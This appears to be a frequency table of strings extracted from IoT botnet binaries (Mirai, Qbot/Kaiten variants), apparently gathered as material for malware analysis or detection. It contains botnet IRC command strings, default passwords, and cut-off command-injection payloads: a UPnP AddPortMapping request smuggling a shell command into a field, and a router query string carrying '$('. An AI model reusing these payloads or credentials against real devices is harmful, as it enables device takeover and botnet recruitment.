"Mozilla/5.0 (Linux; Android 5.1.1; LGLS751 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobi";25;25
"[dumb-init] Child spawned with PID %d.\n";1;1
"N9|`\exT";1;1
"akD\r";1;1
"\bProtocol";1;1
"\bst_value";1;1
"unicode.statictmp_459";3;1
"HdC?";2;1
"\bMSpanSys";1;1
"libgcc2.h";48;28
"collseqmb";1;1
"#*struct { F uintptr; R *rand.Rand }";1;1
"09AFaf";1;1
"table_retrieve_val";44;42
"ts_compute_imprint";5;5
"\e<\nzm5";1;1
"busyboxterrorist";128;128
"STOPATTACKS";17;17
"net.dialResult.1.SetReadDeadline";1;1
"YfKL";2;2
"fmt.(*pp).free";3;1
"runtime.vdso_init_from_sysinfo_ehdr";3;1
"__gnu_unwind_pr_common";86;43
"__ftruncate64";1;1
"__pthread_get_minstack";2;1
"LD_PROFILE";2;2
":\aIPPROTO_NONE";1;1
" *map.iter[string]main.AttackInfo";1;1
"deadline";10;1
"time.Parse";3;1
"*net.byMaskLength";3;1
"could not set time";5;5
":\bIPPROTO_NONE";1;1
"supps";1;1
"/usr/lib/golang/src/strconv/extfloat.go";2;1
"setxid_mark_thread.isra.1";1;1
"\vfffff.";2;2
"assertion failed: bai != NULL";6;6
"__libc_setlocale_lock";1;1
"D$\bHcD$HH";1;1
"spec_flags.6317";1;1
"\\NNJROY=";93;93
"\fbuckhash_sys";1;1
"iplen";1;1
"revocationDate";5;5
"reflect.cvtIntFloat";3;1
"wLI)";1;1
"des-ede-cbc";5;5
"crypto/elliptic.p224Curve.Double";3;1
"TS_VERIFY";5;5
"B\bHcT$\fH";2;2
"crypto/elliptic.p256FromMont.args_stackmap";3;1
"__nss_configure_lookup";1;1
"aeabi_unwind_cpp_pr1.c";24;24
"math.useSSE4";3;1
"../sysdeps/unix/sysv/linux/x86_64/send.c";1;1
"Pj\ahiE";1;1
"E\bRP";23;23
"EVP_PKCS82PKEY";5;5
"s64.data";1;1
"unicode.statictmp_601";3;1
"uname";46;46
"dwE$\t";1;1
"Aol=qiS\b";1;1
"qual_chars.4940";1;1
"nbit";2;1
"github.com/go-sql-driver/mysql.stringToInt";3;1
"in use";5;5
"unicode.statictmp_590";3;1
"·IUU";4;4
"bb.ptr";1;1
"/home/landley/work/ab7/build/temp-armv4tl/build-gcc/gcc";7;1
"UWVS";4120;125
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre";70;70
"mtrim";2;2
"rflags";1;1
"keyblob header parse error";5;5
"io.ReadWriter";4;1
"hp-timing.h";11;1
"$9iwt+";1;1
"AZA[H";4;4
"u}QQh/";1;1
"vuyW\b";1;1
"/home/landley/work/ab7/build/temp-armv4eb/gcc-core/gcc/config/arm";9;1
"\r*mysql.Logger";1;1
"__C_ctype_toupper";307;307
"*bucket<string,regexp/syntax.charGroup>";2;1
"m_qbot2_len";1;1
"loadmsgcat.o";1;1
"nistp521_pre_comp_new";5;5
"CMS_stream";5;5
"eContent";5;5
"hostParts.len";1;1
"spec_flags.4692";1;1
"database/sql.depSet";2;1
"j\aVS";277;58
"ASN1_item_unpack";5;5
"_nl_default_default_domain";1;1
"id-aca-group";5;5
"\tfloatBits";1;1
"ciphertext";7;1
"mt.data";1;1
"edfverthbyrtb";186;186
"W\bfV\bfV\bfVGgU";1;1
"\vsetDeadline";1;1
"\ewh ";1;1
"ASN1_GENERALIZEDTIME_adj";5;5
"nfreed";1;1
"[33]float64";1;1
"ChCaLq";30;30
"$NuNuNV";12;12
"telpowerpc440fp*";16;16
"[1]chan<- internal/singleflight.Result";1;1
"ts_check_status_info";5;5
"os.ProcAttr";4;1
"crtstuff.c";354;354
"assword:";40;40
"\n*[1]uint32";1;1
"net.(*netFD).writeLock";3;1
"D$TPhh";7;7
"crypto.initdone.";1;1
"}*[16]struct { algo x509.SignatureAlgorithm; oid asn1.ObjectIdentifier; pubKeyAlgo x509.PublicKeyAlgorithm; hash crypto.Hash }";1;1
"*crypto/x509.UnhandledCriticalExtension";2;1
"idhuubds";1;1
"SysProcAttr";1;1
"type..eq.[2]interface {}";3;1
"unicode.statictmp_498";3;1
"__GI_rmdir";6;6
"xxb8*";16;16
"\tdHy";1;1
"Proc-Type: 4,";5;5
"\eWO;";1;1
"type..hash.fmt.fmt";3;1
"&exc";1;1
"net.TCPConn";4;1
"tls_construct_cke_gost";6;6
"CgH\t";2;2
"pXo\b";1;1
"type..eq.regexp.entry";3;1
"RSA_padding_add_PKCS1_PSS";5;5
"VIII";2;2
"terminator.8532";1;1
".interp";30;30
"*runtime.randomOrder";3;1
"_C7M79AAAAAC77";1;1
"assertion failed: ((long)msg_hdr->msg_len) > 0";6;6
",*struct { F uintptr; c *[]net.nssCriterion }";1;1
"dlE$";2;2
"des-ede3-ofb";5;5
"unhandled critical extension";5;5
"unicode.statictmp_212";3;1
"}iXP= ";75;75
"\f*[1]net.Addr";1;1
"9\tWL= ";2;2
"net.accept";3;1
"go.itab.*net.dnsRR_PTR,net.dnsRR";3;1
"dh_paramgen_subprime_len";5;5
"statusType";1;1
"struct { F uintptr; net.debugLevel *int; net.dnsMode *string }";2;1
"*hash<reflect.layoutKey,reflect.layoutType>";2;1
"PPh@";1;1
"/proc/net/route";252;252
"8&HHx";2;2
"$pid";1;1
"i2o_SCT_signature";5;5
"_Unwind_GetIPInfo";1;1
"runtime.adjuststkbar";3;1
"unicode.statictmp_387";3;1
"errors";2;1
"res1";1;1
"Cannot send after socket shutdown";4;4
"*database/sql.NullInt64";2;1
"FV|FgUV";5;5
"__PRETTY_FUNCTION__.8607";1;1
"\rRX\f";2;2
"`PHx";1;1
"spinlock.c";33;33
"crypto/x509.oidSHA512";3;1
"ɘ||\exH";6;6
"Directory not empty";369;369
"OCSP_check_validity";5;5
"lock";51;12
"\rAcc\e#{";15;15
"*rsa.PublicKey";1;1
"matchPrompt";230;230
"__getutent_r";1;1
"\eKp"";1;1
"dgram";1;1
"*crypto/tls.ClientHelloInfo";2;1
"WVS1ہ";2;1
"\a\bhh";3;1
";`\\XTP M";1;1
"__stdio_trans2w_o";307;307
"linux/udp.h";2;1
"\n*fmt.State";1;1
"err·3.data#7";1;1
"cred";1;1
"database/sql/driver.Execer";4;1
"6fff";5;5
" *func([]int) reflect.StructField";1;1
"unicode.IsLetter";3;1
"\vsock_addr";1;1
"\fHo(hK";11;11
"type..hash.crypto/rand.devReader";3;1
"mallopt";1;1
"strconv.ErrSyntax";3;1
"net._cgo_cb4050e05860_Cfunc_freeaddrinfo";3;1
"lrand48_r";33;33
"sequence length mismatch";5;5
"CA Repository";5;5
"_Xhd";1;1
"\bsin_family";1;1
"spec_and_mask.6321";1;1
"@sbH";1;1
"dh_rfc5114";5;5
"\rhandshakeCond";1;1
"\ras8";1;1
"mem_write";5;5
"rightRotations.len";1;1
"@dCC`߂";1;1
"__GI___cmsg_nxthdr";33;33
".reMl";1;1
"isPrint.ptr";1;1
"z.cap";2;1
"nitsfkkbu";1;1
"runtime.tracebackothers";3;1
"aHq\eP";1;1
"FGOM";38;38
"getservent";11;11
"*struct { F uintptr; reflect.ss []string }";2;1
"Extension";5;5
"QHN^NuNV";1;1
"ASN1_IA5STRING";1;1
"/usr/lib/golang/src/runtime/lfstack.go";2;1
".symtab";355;355
"wcsnrtombs";307;307
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2";131;131
"zeros";1;1
"L/etc/resolv.conf";1;1
"*bucket<uint32,[]*runtime._type>";2;1
"newval";6;2
"SCT_set_version";5;5
"unicode.ASCII_Hex_Digit";3;1
"x8c\rHK";1;1
"mHo\t|";2;2
"errCert";1;1
"*syntax.patchList";1;1
"enied";223;223
"numRequests";1;1
"BN_mpi2bn";5;5
"tYE&";1;1
"not kek";5;5
"4cNmpC";5;5
"/usr/lib/golang/src/regexp/syntax/parse.go";2;1
"RSA_null_private_decrypt";5;5
"(&ETL";1;1
"*main.FlagInfo";3;1
"main_thread_exiting";33;33
"jjjj橐ﶢ";1;1
"gethostbyname2_r.c";58;58
"DSAparams_print";5;5
"PGR\fCLMLRNWQ\fMPE"";10;10
"tiger123";22;22
"\\$\bPj";1;1
"*struct { lock runtime.mutex; lockOwner *runtime.g; enabled bool; shutdown bool; headerWritten bool; footerWritten bool; shutdownSema uint32; seqStart uint64; ticksStart int64; ticksEnd int64; timeStart int64; timeEnd int64; seqGC uint64; reading runtime.traceBufPtr; empty runtime.traceBufPtr; fullHead runtime.traceBufPtr; fullTail runtime.traceBufPtr; reader runtime.guintptr; stackTab runtime.traceStackTable; strings map[string]uint64; stringSeq uint64; markWorkerLabels [3]uint64; bufLock runtime.mutex; buf runtime.traceBufPtr }";1;1
"secp112r2";5;5
"lastByte";1;1
"[12]uint64";1;1
"RRURR";4;4
"t$\bHc|$";2;1
"kxoZc";2;2
")\rIPPROTO_ROUTING";1;1
"establish_connection";2;1
"\a\r|}\exK";1;1
"\b*[13]int";1;1
"oHcǃ";3;3
"PEM_X509_INFO_write_bio";5;5
"\bUup\b";1;1
"no_resumption_on_reneg";6;6
"SSQSS";4;4
"WWAWW";4;4
"access.c";48;48
"B\nll";5;5
"Usage";12;12
"ALL:!COMPLEMENTOFDEFAULT:!eNULL";6;6
"been_there_done_that.2753";26;26
"aRss";1;1
"_dl_pagesize";2;1
"\ndEK";1;1
"runtime.lfstackpush";3;1
")OpfD";30;2
"Premature end of regular expression";4;4
"nameAssigner";5;5
"__GI_putc_unlocked";54;54
"Microsoft CSP Name";5;5
"struct { F uintptr; R math/rand.Source64 }";2;1
"textNotice";5;5
"qvalue.ptr";1;1
"Extension Request";4;4
"go.itab.*net.TCPConn,io.Writer";3;1
"<uuV";1;1
"*tls.clientHelloMsg";1;1
"supportedPoints";2;1
"unicode.statictmp_267";3;1
"e_entry";1;1
"setct-CapTokenTBE";5;5
"Subject Information Access";5;5
"_dl_random";1;1
"res_modified";1;1
"7LHn";1;1
"do_lookup_alias";1;1
"__sendto_nocancel";1;1
"im.HostID";1;1
"syscall.WaitStatus";1;1
"E`jtA&";1;1
"*[16]string";2;1
"bytes.readOp";1;1
"yydefgoto";1;1
"*string";2;1
"__getrlimit";1;1
"\f$LcD$\fu";2;2
"crypto/tls.(*Conn).flush";3;1
"#\f\rece";1;1
"net.(*TCPConn).SetReadDeadline";3;1
"id-cmc-popLinkWitness";5;5
"crypto.statictmp_5";3;1
"runtime.freezetheworld";3;1
"*regexp.regexpRO";1;1
"setAttr-T2cleartxt";5;5
"net.TCPListener";4;1
"runtime.traceGoSched";3;1
"4*struct { F uintptr; siz int32; d **runtime._defer }";1;1
"_Unwind_Resume";44;44
"_store_inttype";307;307
"spE⌣@8ף";1;1
"missing close square bracket";5;5
"3bBr,";4;4
"incorrect file syntax";5;5
"digest";5;1
"unicode.statictmp_184";3;1
"*bytes.Buffer";2;1
"?V/\rHt\b";1;1
"invalid digit";5;5
"NOTICE %s :Installed %s to hack path.\n";12;12
"\vHCet";1;1
"#exc";7;1
"*runtime.hiter";3;1
"T$BRV";32;32
"`\fWgÄcn";1;1
"[24]string";1;1
"total_alloc";1;1
"\vMT+<";2;2
"unicode.statictmp_577";3;1
"port";27;14
"I5|~\exH";1;1
"\btraceseq";1;1
"reflect.(*ptrType).NumMethod";3;1
"dhSinglePass-stdDH-sha224kdf-scheme";5;5
"RLIMIT_FSIZE";1;1
"5*struct { F uintptr; dc *sql.driverConn; err *error }";1;1
"nextMac";1;1
"kmyarmv4tl";40;40
"r*struct { F uintptr; ret *uintptr; addr unsafe.Pointer; n uintptr; prot int32; flags int32; fd int32; off uint32 }\b";1;1
"$DW|$eUT";1;1
"original";1;1
"*driver.ValueConverter";1;1
"S`clO";1;1
"bad reciprocal";5;5
"\f[4294967296]runtime.elf64Sym";1;1
"\btk\bV";1;1
"\tstackLock";1;1
"__u_short";1;1
"trancell";22;22
"#\biC\t";1;1
"__opensock";13;12
"crypto/sha512.New512_256";3;1
"**[4294967296]uint16";3;1
"W\fdv";1;1
"struct { F uintptr; runtime.h *runtime.mheap; runtime.s *runtime.mspan; runtime.acct int32 }";2;1
"net.isDomainName";3;1
"reflect.(*funcTypeFixed128).Key";3;1
"^8QSh۵";1;1
"[=|`\exT\e";1;1
"exK>";2;2
"rpc_commondata.c";33;33
"next_fn";43;43
"cracknet";105;105
"__outbufend";1;1
"\tȈF\rUU";17;17
"̐||\exH";1;1
"<tCB";2;1
"*[8]*singleflight.call";1;1
"\bmG$";4;1
"\rmissingMethod";1;1
"D$\bdH";3;3
"L$8HcT$4H";2;2
"unicode.statictmp_236";3;1
"Hwget";1;1
"ahHx";2;1
"agc\f";1;1
"HHHHHI";2;2
"IPPROTO_DSTOPTS";1;1
"\aMWSLRLPURVLSRQB1";18;9
"ZDSS";1;1
"PPhtI";3;3
"Suite B: invalid signature algorithm";5;5
"runtime.blockprofilerate";3;1
"[fff";4;2
"kPSSS";1;1
"crypto/tls.(*fixedNonceAEAD).Open";3;1
"syscall.RtGenmsg";4;1
"gfffR";1;1
"cnt < (sizeof (_nl_value_type_LC_PAPER) / sizeof (_nl_value_type_LC_PAPER[0]))";2;2
"nextYield";2;1
"__subsf3";2;2
"PB bPB bPB<";1;1
"`$ET@$gTL";1;1
"pdo\n";3;1
"cannot create search path array";2;2
"SXNET_get_id_asc";5;5
"ÐUWVS";53;52
"friendlyName";5;5
"vendor/golang_org/x/crypto/chacha20poly1305.init";3;1
"bin*";141;141
"/usr/lib/golang/src/runtime/cgo_mmap.go";2;1
"stackblock";1;1
"chan *main.AttackSend";1;1
"D$pPS諌";1;1
"struct { F uintptr; runtime.startTime *int64 }";2;1
"T$XHk";2;2
"dl-support.c";348;348
"[96]unicode.Range16";1;1
"malloc failure";5;5
"ipState.5638";2;2
"type..hash.crypto/sha1.digest";3;1
"6}b`fBr@";7;7
"reflect.(*funcTypeFixed32).PkgPath";3;1
"TTqo";4;4
"waspanic";1;1
"err1.itab#20";1;1
"runtime.forcegchelper";3;1
"l_local_scope";1;1
"arch_kind_intel";1;1
"@|i\exH";2;2
")*func(int) (int, syscall.Sockaddr, error)";1;1
"[5]uint64";1;1
"compression id not within private range";6;6
"lowlevellock.S";1;1
"22HH=Hzu";4;4
"runtime.(*fixalloc).alloc";3;1
"ǾhCB";1;1
"*[]reflect.layoutKey";1;1
"TARGA3";7;7
"assertion failed: ctx->buflen <= ctx->bufsize";5;5
"cms_signerinfo_verify_cert";5;5
"__GI_strpbrk";307;307
"pJo\v";1;1
"jBAS";1;1
"sortlist";1;1
"divShift2";1;1
"oact.7818";1;1
"\red)";1;1
"__GI_fflush";6;6
"j8N^NuNV";1;1
"runtime.queueRescan";3;1
"#%||\eyA";1;1
"__libc_h_errno";59;59
"/\a0.\bey\a|P";1;1
"module_run";5;5
"XM\a\bá\\M\a\bË\rXM\a\b";1;1
"#H\ffpa";43;43
"@NuNV";1;1
"pTo\v";1;1
"DRFQ";2;2
"PKCS7_ATTR_SIGN";5;5
",<\amp";1;1
"\t*[8]uint8";1;1
"UniqueId";1;1
"tlE8";2;2
"HcUĉ";2;2
"0wDf";2;2
"^8PShK";2;1
"LoE$";2;1
"/usr/lib/golang/src/syscall/syscall_linux.go";2;1
"setct-CertReqTBS";5;5
"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000";82;82
"guard";5;5
"u2PPh";4;4
"UnhandledCriticalExtensions";1;1
"AES-128-OCB";5;5
"\\$Thp_";1;1
"&*func(*runtime.g, unsafe.Pointer) bool";1;1
"FAST-WebCrawler/3.x Multimedia";70;70
"պVUUUD";2;2
"^8QShkJ";1;1
"time.readFile";3;1
"puD$$";1;1
"err.data#6";2;1
"crypto/x509v3/v3_akey.c";5;5
"spec_chars.4025";26;26
"runtime.callers";3;1
"runtime.mheap_";3;1
"_L_lock_54";1;1
"PKCS12_unpack_authsafes";5;5
"vendor/golang_org/x/crypto/chacha20poly1305/internal/chacha20.initdone.";1;1
"WWh0";2;2
"os.(*File).Read";3;1
"net.dnsRR_A";4;1
"pthread_handle_sigcancel";33;33
"unicode.Sundanese";3;1
"**runtime._panic";3;1
"\ncalling init: %s\n\n";2;2
"HcD$<H9";2;2
"\v*[13]string";1;1
"runtime.traceAcquireBuffer";3;1
"xxb3*";16;16
"\fEim";1;1
"unicode.statictmp_343";3;1
"__argz_add_sep";1;1
"jumped";1;1
"crypto/x509v3/v3_utl.c";4;4
"5678Service";22;22
"chan<- internal/singleflight.Result";1;1
"gconv_conf.c";2;2
"*[]driver.Value";1;1
"\aalloc_m";1;1
"\f[67]struct { runtime.size uint32; runtime.nmalloc uint64; runtime.nfree uint64 }";1;1
"dl_merger";5;5
"@dCPp߂";1;1
"unknown digest algorithm";5;5
"\rch5";1;1
"type..hash.struct { runtime.root runtime.semaRoot; runtime.pad [32]uint8 }";3;1
"signedAttrs";4;4
"Advertise error";365;365
"shintoo.arm7";25;25
"__nss_lookup";1;1
"unicode.initdone·";2;1
"crypto/cipher.xorWords";3;1
"sslv3 alert illegal parameter";6;6
"ec_key_simple_check_key";5;5
"rand.c";324;323
"\f[4294967296]uint8";1;1
"\valloc_bytes";1;1
"5*[251]struct { root runtime.semaRoot; pad [32]uint8 }";1;1
"regexp.(*inputReader).hasPrefix";3;1
"npages";5;1
"imap->l_type == lt_loaded && (imap->l_flags_1 & 0x00000008) == 0";2;2
"eckey_param_decode";5;5
"runtime.archauxv";3;1
"\axN^NuNV";1;1
"\acurveid";1;1
"SPSh=e";1;1
"app data in handshake";6;6
"_Unwind_RaiseException";44;44
"INPUT -p udp --dport %u -j ACCEPT";1;1
"advances2";201;201
"_L_lock_13844";1;1
"reflect.(*funcTypeFixed4).ConvertibleTo";3;1
"<cuJ";24;24
",NuNV";7;7
"*struct { F uintptr; net.i *int; net.s *string }";2;1
"Close";1;1
"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2";70;70
"arfgG";150;150
"\vHCen";2;2
"Powerk";13;13
"pthread_create";39;37
"\rDq1";1;1
"func(int32) bool";4;1
"ret.len";14;1
"*struct { F uintptr; crypto/tls.h func() hash.Hash }";2;1
"\f*sync.Locker";1;1
"_Unwind_Reason_Code";44;44
"ptr___pthread_cond_wait_2_0";1;1
"runtime.sigtable";3;1
"go.itab.*context.timerCtx,context.canceler";3;1
"err·3.data#8";3;1
"net.(*UnknownNetworkError).Temporary";3;1
"github.com/go-sql-driver/mysql.(*mysqlConn).handleParams";3;1
"__prev";1;1
"crypto/rsa.statictmp_592";3;1
"__printf_arginfo_table";1;1
"swapVerticalBar";1;1
"9\tbP= ";1;1
"D\aGC";2;2
"ssl/t1_reneg.c";6;6
"net.errClosing";3;1
"\vset_sigaddr";1;1
"prevRune";1;1
"\ttableName";1;1
"map[*database/sql.driverStmt]bool";2;1
"unlink";83;82
"WHw\t (";1;1
"P&<\tFGK,B";1;1
"pcPathLengthConstraint";5;5
"tname.bytes";1;1
"runtime.panicoverflow";3;1
"__GI_send";348;348
"POST /wanipcn.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 590\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;>c";6;6
"@dCI";10;1
"[1]unicode.Range16";1;1
"%3`\vot\a";1;1
"&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28";7;7
"*reflect.funcTypeFixed128";3;1
"ِ||\exH";1;1
"\bTc\a>";12;12
"runtime.SetFinalizer.func1";3;1
"t~tsbj";1;1
"/bin/busybox MIORI\r\n";1;1
"|*struct { note runtime.note; mask [3]uint32; wanted [3]uint32; ignored [3]uint32; recv [3]uint32; state uint32; inuse bool }";1;1
"LD_ORIGIN_PATH";2;2
"time.parseTimeZone";3;1
"database/sql.connReuseStrategy";1;1
"noalg.[2]struct { os/exec.elem *uint8; os/exec.chan *uint8; os/exec.pc uintptr; os/exec.kind uint16; os/exec.so uint16; os/exec.receivedp *uint8; os/exec.releasetime uint64 }";3;1
"__open_nocancel";60;60
"MSG_EOR";1;1
"hackmysh4";40;40
"}HKy";2;2
"?\bwA";1;1
"\eSignedCertificateTimestamps";1;1
"\ncatchPanic";1;1
"unicode.Phags_Pa";3;1
"NOTICE %s :Kaiten Ziggy Qbot Redo by Milenko version 13.3.7\n";7;7
"Server";2;1
"localtime";1;1
"C8/proc/net/tcp";1;1
"writing strings";5;5
"\b@\a\bXZj";1;1
"Setctty";1;1
"HcHT";7;6
"ipState.5625";4;4
"database/sql.(*DB).Exec";3;1
"noalg.map.bucket[string]int";4;1
"PONG!";206;206
"PPhV";1;1
"OuvV]93x";2;2
"KBg_";1;1
"reflect.typelinks";3;1
"webadmin";22;22
"Sub0";2;1
"\t*[3]uint8";1;1
"net.(*netFD).setReadDeadline";3;1
"TEXT";1;1
"type..hash.time.Time";3;1
"crypto/tls.(*clientHandshakeState).establishKeys";3;1
"Protocol error";369;369
"\vfH9)";1;1
"]jRm;";1;1
"\bSV耊";1;1
"'Kgk\b";3;1
"sa_data";1;1
"crypto/cipher.statictmp_382";3;1
"C\bPSS";56;56
"&dstp";1;1
"unicode.statictmp_280";3;1
"\aWeekday";1;1
"4Qfg";1;1
"Kakuta";17;17
"strtoq";7;7
"[8][4][16]uint8";1;1
"/usr/lib/golang/src/os/pipe_linux.go";2;1
"\aEncrypt";1;1
"dQ\a\bhQ\a\b";1;1
"*[][32]*runtime._defer";1;1
"ATUSD";2;2
"id-tc26-signwithdigest";5;5
"'UBTW";1;1
"idp mismatch";5;5
"clientIV";1;1
"type..eq.reflect.funcTypeFixed4";3;1
"PRIVMSG %s :>bot +unknown <target> <secs>\n";13;13
"ipsec Internet Key Exchange";5;5
"tHNtL";1;1
"noticenos";5;5
"unicode.statictmp_169";3;1
"\vreflect.tflag";1;1
"ColumnConverter";1;1
"telsh2elf";45;45
"__GI_config_open";88;88
"runtime.statictmp_6327";3;1
"nhandoffcnt";1;1
"This is LOIC";5;5
"NOTICE %s :    SHD <command> = Executes a psuedo-daemonized command\n";5;5
"BN_mod_exp_mont";5;5
"runtime.mcall";3;1
"unknown.2050";25;25
"driveri.data";1;1
"net.(*fdMutex).incref";3;1
"UUUUUUU";4;2
"CLASS_SNAN";5;5
"__syscall_cp.c";3;3
"*[4]runtime.cpuprofEntry";1;1
"context.(*deadlineExceededError).Timeout";3;1
"sdlsym.o";1;1
"syscall.Signal.Signal";3;1
"dnsSource";1;1
"net.glob..func8";3;1
"ecc cert not for signing";6;6
"crypto/x509.UnknownAuthorityError.Error";3;1
"HcL$TH";28;28
"empty srtp protection profile list";6;6
"__tzname";1;1
"RESOLV_HOST_CONF";2;2
"*\apd";1;1
"DSA_new_method";5;5
"\f[1]crypto/x509.ExtKeyUsage";1;1
"reflect.(*funcTypeFixed16).AssignableTo";3;1
"Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)";70;70
"runtime.(*mheap).scavenge";3;1
"\n*[32]uint8";1;1
"\bIPPROTO_PIM";1;1
"thisg";2;1
"&barrierOffset";1;1
"L_uClibc_main";28;28
"cFOKL";93;64
"d#esf3g*";1;1
"[32]*runtime._defer";1;1
"\nfinalClose";1;1
"7*[]struct { Size uint32; Mallocs uint64; Frees uint64 }";1;1
"__xstat32_conv";88;88
"1*struct { F uintptr; gp *runtime.g; dst uintptr }";1;1
"GOST89(256)";6;6
"3WCp";1;1
"Printf";1;1
"ZLONG";6;6
"syscall.Pipe2";3;1
"../posix/sys";14;1
"@*func(context.Context, []driver.NamedValue) (driver.Rows, error)";1;1
"pthread_call_handlers";33;33
"__gconv_get_path";3;2
"buf.6501";1;1
"sort.Stable";3;1
"\n\n\n\n\n\n\n\n(nil)";1;1
"runtime.addfinalizer";3;1
"_cgo_cb4050e05860_Cfunc_getaddrinfo";2;1
"JX/dev/null";1;1
"A7AAAAAAU#";1;1
"util_isupper";2;1
"NIF\n";8;8
"xdigits.3743";1;1
"v.typ";3;1
"xwyz敲潳癬挮猀慣湮牥挮猀瑥灵损湯敮瑣潩n摡彤畡桴敟瑮祲䌀㐮⸲〵㤰䌀㐮⸳〵〱琀扡敬挮甀楴";2;2
"7*struct { lock runtime.mutex; list []runtime.guintptr }";1;1
"QGAWPKV[";38;38
"\boGc";1;1
"M\beI\aLP";1;1
"\twTE";1;1
"PTRhX\t";1;1
"jackmyx86_64*";16;16
"type..eq.database/sql.driverResult";3;1
"\brQ$\b";1;1
"Not supported";4;4
"@dCK ߂";1;1
"unicode.statictmp_346";3;1
"_dl_reloc_bad_type";1;1
"\n*sync.Pool";1;1
"RRj\tP";58;38
"\vwo+\vaC";1;1
"T$8XZj";27;27
"TS_RESP_set_tst_info";5;5
"L;k\bwWL)k\bD";2;2
"__shlib_handle";1;1
"colon_space.4662";1;1
"net.(*netFD).setDeadline";3;1
"s\rtom|";1;1
"signerInfos";5;5
"runtime.dumpgstatus";3;1
"stdin";352;350
"waitreason";1;1
"net.statictmp_4079";3;1
"X509_ALGORS";6;6
"PRIVMSG %s :[TELNET] [+] SUCCESSFUL INFECTION ---> %s:%s:%s\n";7;7
"gethostbyaddr_r.c";11;11
"aes256-wrap";4;4
"\bSPh([";2;2
"_Unwind_SetIP";1;1
"PqB$";1;1
"table_init";44;42
"__new_exitfn";36;35
"8dckH";1;1
"runtime.mspinning";3;1
"H\tIAx8Hp";2;2
"unicode.statictmp_505";3;1
"¯5wOCl";1;1
"sect113r2";5;5
"int_no <= (uintmax_t) ((9223372036854775807L) + (-1021) - 53) / 4";2;2
"doff";1;1
"@h\btDL";2;2
"Elf64_Word";1;1
""\t%FQX%";1;1
"no accept addr or service specified";5;5
"pVo\b";2;1
"crypto/aes.aesCipherAsm";5;1
";S\vbX L";1;1
"net/_obj/_cgo_import.go";2;1
"#Psz\a";1;1
"Basic OCSP Response";5;5
"\tlen";1;1
"_L_unlock_2586";1;1
"/usr/lib/golang/src/crypto/tls/prf.go";2;1
"qual_chars.4029";26;26
"__malloc_heap";186;186
"HcIL$4H";2;2
"aRba(";4;4
"stat";52;47
"getpagesize";310;310
"bytes.(*Buffer).WriteRune";3;1
"ASN1_STRING_type_new";5;5
"net.services";3;1
"spec_base.6303";8;8
"cron";25;25
"TS_RESP_CTX_new";5;5
"it_value";1;1
"type..eq.[87]strconv.extFloat";3;1
"8cMXK";1;1
"dyn_temp.9387";1;1
"\ns_addr";1;1
"type..eq.reflect.funcTypeFixed64";3;1
"\bsi_errno";1;1
"9\tlD= ";2;1
"assertion failed: *sbuffer != NULL";6;6
"kakuta.mpsl";25;25
"*[15]unicode.Range16";1;1
"/usr/lib/golang/src/os/wait_waitid.go";2;1
"\vai_socktype";1;1
"unicode.statictmp_531";3;1
"\fcrypto/elliptic.p224FieldElement";1;1
" !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";325;325
"v2i_issuer_alt";5;5
"ADH-AES128-SHA";6;6
